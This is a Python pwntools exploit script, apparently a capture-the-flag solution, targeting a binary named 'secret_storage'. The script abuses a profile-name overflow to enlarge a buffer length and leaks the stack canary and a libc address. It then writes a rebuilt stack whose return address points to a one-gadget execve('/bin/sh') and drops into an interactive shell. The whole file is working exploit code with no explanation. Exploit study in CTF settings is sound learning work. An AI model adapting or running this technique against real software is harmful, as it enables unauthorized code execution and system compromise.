from pwn import *

elf = ELF('./secret_storage', checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)

def set_secret(length, data):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b':', b'%d' % length)
    p.sendafter(b':', b'%s' % data)

def get_secret():
    p.sendlineafter(b'>>', b'2')
    return p.recvline_contains(b'secret')[15:]

def edit_profile(data):
    p.sendlineafter(b'>>', b'3')
    p.sendafter(b'name:', b'%s' % data)

p = elf.process()

# padding overwrite length var
edit_profile(cyclic(8) + p64(0x80 + 8*8))
set_secret(0x81, b'BBBB')
# length = 0x90
leak = get_secret()[0x80:]
stack = ([ u64(leak[i:i+8]) for i in range(0, len(leak), 8) ])

canary = stack[1]
libc.address = stack[7] - (libc.sym['__libc_start_main'] + 243)

log.info('canary @ 0x%x' % canary)
log.info('libc base @ 0x%x' % libc.address)

# write 0x90 byte
edit_profile(cyclic(8) + p64(0x80 + 8*8))
set_secret(0x81, b'CCCC')

# setup payload
# 0xcd530 execve("/bin/sh", rsi, rdx)
stack[7] = libc.address + 0xcd530
payload = b'\x00'*0x80
for chunk in stack:
    payload += p64(chunk)

p.sendlineafter(b'>>', b'1')
p.sendafter(b':', b'%s' % payload)
p.sendlineafter(b'>>', b'4')
p.interactive()
